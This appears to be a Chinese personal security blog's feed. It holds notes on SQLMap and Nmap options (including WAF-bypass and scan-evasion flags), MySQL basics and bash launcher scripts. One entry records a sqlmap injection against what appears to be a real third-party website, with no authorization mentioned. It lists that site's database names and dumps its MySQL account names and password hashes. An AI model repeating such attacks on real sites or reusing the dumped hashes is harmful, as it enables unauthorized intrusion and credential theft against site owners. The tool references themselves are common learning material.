        <content type="html"><![CDATA[<p>在浏览别人分享的文章后，了解到SQLMap的灵活性，学习到了新姿势，觉得自己又菜了，有好工具不会用你说气人不气人，简直就是暴殄天物。没有仔细地看过这款工具，这可能就是差距吧。orz</p><h2 id="SQLMap注入"><a href="#SQLMap注入" class="headerlink" title="SQLMap注入"></a>SQLMap注入</h2><h3 id="SQLMap支持的数据库"><a href="#SQLMap支持的数据库" class="headerlink" title="SQLMap支持的数据库"></a>SQLMap支持的数据库</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h3 id="SQLMap参数介绍"><a href="#SQLMap参数介绍" class="headerlink" title="SQLMap参数介绍"></a>SQLMap参数介绍</h3><p>今天突发奇想记录一下SQLMap常用的参数，平常我也没怎么用过。就先记下吧。</p><p><code>sqlmap.py -u &quot;www.xxx.com&quot; -v 3 --flush-session</code></p><blockquote><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数</p><p>共有7个等级，默认为1</p><p>0、只显示python错误以及严重的信息。</p><p>1、同时显示基本信息和警告信息。（默认）</p><p>2、同时显示debug信息。</p><p>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>注：如果你想看到sqlmap发送的测试payload最好的等级就是3。</p></blockquote><p>不知道后面参数<code>--flush-session</code>的意思，只能百度搜一下看看。有用有用。</p><blockquote><p>参数：–flush-session<br>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。自动获取form表单测试</p></blockquote><p><code>sqlmap -u &quot;www.xxx.com&quot; -v 3 --technique=B -D security -T users -C &#39;id,username,password&#39; --dump</code></p><p>不知道后面参数<code>--technique=B</code>的意思，只能百度搜一下看看。</p><blockquote><p>参数：–technique<br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>–technique=B<br>支持的探测方式如下：<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p></blockquote><p>把GET请求改为POST请求发送</p><blockquote><p>参数：–data<br>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。<br>例子：<br>python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”id=1” -f –banner –dbs –users</p></blockquote><p><code>-p</code>手动指出存在注入的参数</p><blockquote><p>参数：-p,–skip<br>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”<br>当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。<br>例如：–skip=”user-angent.referer”</p></blockquote><p><code>--random-agent</code>随机user-agent</p><blockquote><p>参数：–user-agent,–random-agent<br>默认情况下sqlmap的HTTP请求头中User-Agent值是：<br>sqlmap/1.0-dev-xxxxxxx (<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)<br>可以使用–user-anget参数来修改，同时也可以使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。</p></blockquote><p><code>tamper</code>防止过滤，绕waf用的。</p><blockquote><p>参数：–tamper<br>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。<br>例如：–temper=”between”</p></blockquote><p><code>--batch</code> 使用默认的选项进行下一步</p><p><code>-r</code> 使用burpsuite抓包，把请求包放进txt文件，用sqlmap读这个文件就可以了。</p><blockquote><p>什么时候使用-r参数</p><p>post注入、搜索型注入、http头注入、登陆后的注入点。</p></blockquote><p><code>--delay=0.2</code> 0.2s发一个请求，可以设置sqlmap发送请求的速度。</p><h3 id="sqlmap闭合语句"><a href="#sqlmap闭合语句" class="headerlink" title="sqlmap闭合语句"></a>sqlmap闭合语句</h3><blockquote><p>尝试使用<code>)</code>来闭合前面的语句<br>直接注入，使用<code>--</code>注释掉后面的语句<br>使用 <code>&#39;)</code>来闭合前面语句 构造一个判断条件 使用<code>(&#39;</code>闭合后面语句<br>使用<code>&#39;</code>来闭合前面语句 构造一个判断条件 使用<code>&#39;</code>闭合后面语句<br><code>&#39;;</code>闭合前面语句 <code>#</code> 闭合后面语句<br><code>&#39;;</code> 闭合前面语句 构造’zOkG’=’zOkG 用单引号<code>&#39;</code>闭合后面语句</p></blockquote><p>参考文章：SQLMap用户手册<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>]]></content>
      
      
      <categories>
          
          <category> SQLMap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用参数记录</title>
      <link href="/2020/03/03/Nmap/"/>
      <url>/2020/03/03/Nmap/</url>
      
        <content type="html"><![CDATA[<p>nmap，端口扫描神器。但是扫描速度有点慢。</p><h2 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h2><h3 id="nmap介绍"><a href="#nmap介绍" class="headerlink" title="nmap介绍"></a>nmap介绍</h3><p>Nmap — 网络探测工具和安全/端口扫描器。</p><h3 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h3><p>ping扫描</p><p><code>nmap -sP 192.168.0.1/24</code></p><p>SYN扫描（半开扫描）</p><p><code>nmap -sS 192.168.0.1/24</code></p><p><code>-P0</code>   扫描前不用ping命令</p><p><code>-O</code>    判断操作系统，存在误报</p><p><code>-oN</code>  输出txt文件</p><p><code>-iL</code>    读取主机列表，“-iL C:\ip.txt”</p><p><code>-vv</code>对结果进行详细的输出</p><p><code>-PR</code>使用ARP协议扫描</p><p><code>-T4</code>时间优化(0-5)，默认是<code>T3</code>，建议使用T4</p><p><code>-F</code>快速扫描</p><p><code>-Pn</code> <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> 穿透防火墙扫描结果</p><h3 id="nmap参数"><a href="#nmap参数" class="headerlink" title="nmap参数"></a>nmap参数</h3><pre><code class="shell">nmap --helpNmap 7.70 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] {target specification}TARGET SPECIFICATION:  Can pass hostnames, IP addresses, networks, etc.  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254  -iL &lt;inputfilename&gt;: Input from list of hosts/networks  -iR &lt;num hosts&gt;: Choose random targets  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks  --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY:  -sL: List Scan - simply list targets to scan  -sn: Ping Scan - disable port scan  -Pn: Treat all hosts as online -- skip host discovery  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes  -PO[protocol list]: IP Protocol Ping  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers  --system-dns: Use OS&#39;s DNS resolver  --traceroute: Trace hop path to each hostSCAN TECHNIQUES:  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans  -sU: UDP Scan  -sN/sF/sX: TCP Null, FIN, and Xmas scans  --scanflags &lt;flags&gt;: Customize TCP scan flags  -sI &lt;zombie host[:probeport]&gt;: Idle scan  -sY/sZ: SCTP INIT/COOKIE-ECHO scans  -sO: IP protocol scan  -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER:  -p &lt;port ranges&gt;: Only scan specified ports    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning  -F: Fast mode - Scan fewer ports than the default scan  -r: Scan ports consecutively - don&#39;t randomize  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE/VERSION DETECTION:  -sV: Probe open ports to determine service/version info  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)  --version-light: Limit to most likely probes (intensity 2)  --version-all: Try every single probe (intensity 9)  --version-trace: Show detailed version scan activity (for debugging)SCRIPT SCAN:  -sC: equivalent to --script=default  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of           directories, script-files or script-categories  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts  --script-args-file=filename: provide NSE script args in a file  --script-trace: Show all data sent and received  --script-updatedb: Update the script database.  --script-help=&lt;Lua scripts&gt;: Show help about scripts.           &lt;Lua scripts&gt; is a comma-separated list of script-files or           script-categories.OS DETECTION:  -O: Enable OS detection  --osscan-limit: Limit OS detection to promising targets  --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE:  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).  -T&lt;0-5&gt;: Set timing template (higher is faster)  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies      probe round trip time.  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.  --host-timeout &lt;time&gt;: Give up on target after this long  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL/IDS EVASION AND SPOOFING:  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys  -S &lt;IP_Address&gt;: Spoof source address  -e &lt;iface&gt;: Use specified interface  -g/--source-port &lt;portnum&gt;: Use given port number  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies  --data &lt;hex string&gt;: Append a custom payload to sent packets  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets  --data-length &lt;num&gt;: Append random data to sent packets  --ip-options &lt;options&gt;: Send packets with specified ip options  --ttl &lt;val&gt;: Set IP time-to-live field  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address  --badsum: Send packets with a bogus TCP/UDP/SCTP checksumOUTPUT:  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.  -oA &lt;basename&gt;: Output in the three major formats at once  -v: Increase verbosity level (use -vv or more for greater effect)  -d: Increase debugging level (use -dd or more for greater effect)  --reason: Display the reason a port is in a particular state  --open: Only show open (or possibly open) ports  --packet-trace: Show all packets sent and received  --iflist: Print host interfaces and routes (for debugging)  --append-output: Append to rather than clobber specified output files  --resume &lt;filename&gt;: Resume an aborted scan  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML  --webxml: Reference stylesheet from Nmap.Org for more portable XML  --no-stylesheet: Prevent associating of XSL stylesheet w/XML outputMISC:  -6: Enable IPv6 scanning  -A: Enable OS detection, version detection, script scanning, and traceroute  --datadir &lt;dirname&gt;: Specify custom Nmap data file location  --send-eth/--send-ip: Send using raw ethernet frames or IP packets  --privileged: Assume that the user is fully privileged  --unprivileged: Assume the user lacks raw socket privileges  -V: Print version number  -h: Print this help summary page.EXAMPLES:  nmap -v -A scanme.nmap.org  nmap -v -sn 192.168.0.0/16 10.0.0.0/8  nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</code></pre><pre><code class="shell">Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段--exclude host1[, host2]        从扫描任务中需要排除的主机          --exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同主机发现-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启  -n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析扫描技巧-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描指定端口和扫描顺序-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口服务版本识别-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息脚本扫描-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助OS识别-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配防火墙/IDS躲避和哄骗-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口 --proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包Nmap 输出-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表时间性能优化-T 　 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--host-timeout time　　设置扫描主机的最大时间其他nmap选项-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
      
      
      <categories>
          
          <category> Nmap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基本使用</title>
      <link href="/2020/03/02/mysql-1/"/>
      <url>/2020/03/02/mysql-1/</url>
      
        <content type="html"><![CDATA[<p>其他的数据库还没用过，就在这里先记录一下MySQL数据库的基本操作吧。我有点怀疑我为什么要写这个了。随便百度都能百度到的东西，我跪了（没办法，我是真的菜鸡）。</p><h2 id="数据库的基本用法"><a href="#数据库的基本用法" class="headerlink" title="数据库的基本用法"></a>数据库的基本用法</h2><p>数据库的种类有很多，也有对应的图形化管理界面，但还是要掌握使用命令来对数据库进行操作。</p><p>由于平常自己也很少使用数据库，现在只记录一些最基本的用法。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>登录数据库；</p><pre><code class="shell">mysql -u root -p</code></pre><p>查看数据库；</p><pre><code class="shell">mysql&gt; show databases;   +--------------------+| Database           |+--------------------+| information_schema || app                || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)</code></pre><p>删除app数据库；</p><pre><code class="shell">mysql&gt; drop database app;Query OK, 0 rows affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)</code></pre><p>创建app数据库；</p><pre><code class="shell">mysql&gt; create database app;Query OK, 1 row affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || app                || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)</code></pre><p>选择数据库，查看数据库中的表；</p><pre><code class="shell">use app;    show tables;   </code></pre><p>选择数据库，创建一个新表，插入一行新数据；</p><pre><code class="shell">mysql&gt; use app;Database changedmysql&gt; create table table_name(id int,username varchar(50),password varchar(50));Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from table_name;Empty set (0.00 sec)mysql&gt; insert into table_name(id,username,password) values(1,&#39;root&#39;,&#39;toor&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     |+------+----------+----------+1 row in set (0.00 sec)</code></pre><p>插入多行新数据；</p><pre><code class="shell">mysql&gt; insert into table_name(id,username,password) values(2,&#39;admin&#39;,&#39;admin123&#39;),(3,&#39;sysadm&#39;,&#39;admin456&#39;),(4,&#39;secadm&#39;,&#39;secadm&#39;);Query OK, 3 rows affected (0.01 sec)Records: 3  Duplicates: 0  Warnings: 0mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | secadm   |+------+----------+----------+4 rows in set (0.00 sec)</code></pre><p>更新表中的字段内容；</p><pre><code class="shell">mysql&gt; update table_name set password=&#39;123456&#39; where id=4;Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | 123456   |+------+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from table_name where id=4;+------+----------+----------+| id   | username | password |+------+----------+----------+|    4 | secadm   | 123456   |+------+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | 123456   |+------+----------+----------+4 rows in set (0.00 sec)</code></pre><p>删除一行数据；</p><pre><code class="shell">mysql&gt; delete from table_name where id=3;Query OK, 1 row affected (0.01 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    4 | secadm   | 123456   |+------+----------+----------+3 rows in set (0.00 sec)mysql&gt; exitBye</code></pre><h3 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a>SQL server</h3><h3 id="access"><a href="#access" class="headerlink" title="access"></a>access</h3><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的SQL注入</title>
      <link href="/2020/03/01/sqlmap-2/"/>
      <url>/2020/03/01/sqlmap-2/</url>
      
        <content type="html"><![CDATA[<p>这是之前学习SQLMAP时做过的记录，第一次使用SQL注入获取用户密码，当时还是挺激动的，虽然这个很简单。存粹的学习记录，把一些试错的过程删掉了。</p><h2 id="SQLMAP注入"><a href="#SQLMAP注入" class="headerlink" title="SQLMAP注入"></a>SQLMAP注入</h2><p>首先查找到注入点，用sqlmap进行注入。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot;</code></p><p>查看当前数据库。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-db</code></p><pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-dbcurrent database: &#39;bible_history&#39;</code></pre><p>查看所有数据库。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbs</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbsavailable databases [18]:[] ancient_questions[] axiom_sewers[] bible_glossary[] bible_history[] grosh[] hmc_hmcinspire[] infofaq[] information_schema[] kidsbibledictionary[] kidsmaps[] mysql[] performance_schema[] portlandroofrepair[] russellcraft[] rusty_ancient[] rusty_biblemaps[] rusty_even[] w2605a</code></pre><p>列出数据库中的所有表。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql</code></p><pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql+---------------------------+| user                      || column_stats              || columns_priv              || db                        || event                     || func                      || general_log               || gtid_slave_pos            || help_category             || help_keyword              || help_relation             || help_topic                || host                      || index_stats               || innodb_index_stats        || innodb_table_stats        || plugin                    || proc                      || procs_priv                || proxies_priv              || roles_mapping             || servers                   || slow_log                  || table_stats               || tables_priv               || time_zone                 || time_zone_leap_second     || time_zone_name            || time_zone_transition      || time_zone_transition_type || transaction_registry      |</code></pre><p>列出表中的所有字段</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql[47 columns]+------------------------+-----------------------------------+| Column                 | Type                              |+------------------------+-----------------------------------+| User                   | char(80)                          || Alter_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Alter_routine_priv     | enum(&#39;N&#39;,&#39;Y&#39;)                     || authentication_string  | text                              || Create_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_routine_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_tablespace_priv | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_tmp_table_priv  | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_user_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_view_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || default_role           | char(80)                          || Delete_history_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     || Delete_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Drop_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     || Event_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Execute_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || File_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     || Grant_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Host                   | char(60)                          || Index_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Insert_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || is_role                | enum(&#39;N&#39;,&#39;Y&#39;)                     || Lock_tables_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || max_connections        | int(11) unsigned                  || max_questions          | int(11) unsigned                  || max_statement_time     | decimal(12,6)                     || max_updates            | int(11) unsigned                  || max_user_connections   | int(11)                           || Password               | char(41)                          || password_expired       | enum(&#39;N&#39;,&#39;Y&#39;)                     || plugin                 | char(64)                          || Process_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || References_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     || Reload_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Repl_client_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || Repl_slave_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     || Select_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Show_db_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || Show_view_priv         | enum(&#39;N&#39;,&#39;Y&#39;)                     || Shutdown_priv          | enum(&#39;N&#39;,&#39;Y&#39;)                     || ssl_cipher             | blob                              || ssl_type               | enum(&#39;&#39;,&#39;ANY&#39;,&#39;X509&#39;,&#39;SPECIFIED&#39;) || Super_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Trigger_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || Update_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || x509_issuer            | blob                              || x509_subject           | blob                              |+------------------------+-----------------------------------+</code></pre><p>列出所有数据</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysqlDatabase: mysqlTable: user[6 entries]+------------------+| user             |+------------------+| debian-sys-maint || infofaq          || root             || root             || root             || rusty            |+------------------+</code></pre><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysqlDatabase: mysqlTable: user[6 entries]+-------------------------------------------+| password                                  |+-------------------------------------------+| *7A3ACC64D7B725A0680FFA56DC07AA09004884CF || *CE54DB2032962B216435BB5F02709003A9BB1C63 || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EEC1F40CA2B7988614C13911FD576B685201396B |+-------------------------------------------+</code></pre>]]></content>
      
      
      <categories>
          
          <category> SQLMap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> SQLMap </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于BASH脚本的学习</title>
      <link href="/2020/02/24/bash-1/"/>
      <url>/2020/02/24/bash-1/</url>
      
        <content type="html"><![CDATA[<p>这一天，在网上冲浪中度过，发现比较简单实用的bash脚本，看到脚本对日常使用的助力，感觉还不错就记录一下，就当是bash脚本的入门吧。为了避免自己忘记，就在此作为第一篇博客记录一下吧。</p><h2 id="案例一：打开软件的小脚本"><a href="#案例一：打开软件的小脚本" class="headerlink" title="案例一：打开软件的小脚本"></a>案例一：打开软件的小脚本</h2><p>将经常使用的命令写成一个脚本能够提高效率。</p><p><code>vim burp.sh</code></p><pre><code class="bash">#!/bin/bashcd /root/Desktop/burpsuuite1.7.6java -jar BurpLoader.jar</code></pre><p>给文件一个执行权限<code>chmod +x burp.sh</code></p><p><code>./burp.sh</code></p><p>这样，一个简单的脚本文件就完成了。挺简单的，作为一个小白，发现脚本文件真的挺实用的，特别在面对大量重复的命令而言。</p><h2 id="案例二：打开软件脚本的进阶版"><a href="#案例二：打开软件脚本的进阶版" class="headerlink" title="案例二：打开软件脚本的进阶版"></a>案例二：打开软件脚本的进阶版</h2><pre><code class="bash">#!/bin/bash#the tool you want to runread -p &quot;bp == burp ; w == DirBuster ; f == cknife ; p =openvpn ;&quot; choiceif [ &quot;${choice}&quot; == &quot;bp&quot;]; then        cd tool/burpsuite1.7.26        java -jar BurpLoader.jarfiif [ &quot;${choice}&quot; == &quot;w&quot;]; then        cd tool/DirBuster-0.12/        java -jar DirBuster-0.12.jarfiif [ &quot;${choice}&quot; == &quot;f&quot;]; then        cd tool/cknife/        java -jar cknife.jarfiif [ &quot;${choice}&quot; == &quot;p&quot;]; then        cd tool/DirBuster-0.12/        java -jar DirBuster-0.12.jarfi</code></pre><p>在这个脚本中出现了变量，需要注意的是</p><ol><li>变量要用<code>${ }</code>标识</li><li>每一个特定的符号都要用引号<code>&quot;&quot;</code>括起来</li><li><code>if</code>语句要用中括号<code>[]</code>括起来，两边要加空格</li><li><code>cd</code>转换路径，路径左侧不能加<code>/</code>，如<code>cd /tool</code>（错误），<code>/tool</code>表示根目录下的tool文件夹。</li></ol><p>目前关于bash脚本就先记录这些吧。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> BASH </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
